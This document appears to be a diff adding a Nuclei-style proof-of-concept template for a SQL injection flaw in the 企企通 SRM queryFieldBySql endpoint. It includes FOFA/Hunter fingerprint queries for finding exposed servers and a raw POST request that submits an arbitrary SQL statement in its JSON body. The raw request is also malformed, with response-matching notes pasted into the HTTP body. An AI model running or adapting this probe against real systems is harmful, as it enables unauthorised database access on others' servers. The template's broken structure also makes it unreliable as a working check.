@@ -1,0 +1,54 @@
+id: poc-rayuv5ry9esle1t2
+info:
+  name: 企企通-queryFieldBySql-SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rayuv5ry9esle1t2'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rayuv5ry9esle1t2
+    fofa: 'fofa: body="welcome-srm-wrap" hunter: web.icon="eb7cf31489c9ec6dac1611d452ecafe1"||body="welcome-srm-wrap"'
+http:
+- raw:
+  - 'POST /els/report/jmreport/queryFieldBySql HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept: */*
+
+
+    Connection: close
+
+
+    Content-Type: application/json
+
+
+    Cookie: Path=/
+
+
+
+
+    {"dbSource": "", "sql": "select 1#''"}
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?code)(?=.*?200).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
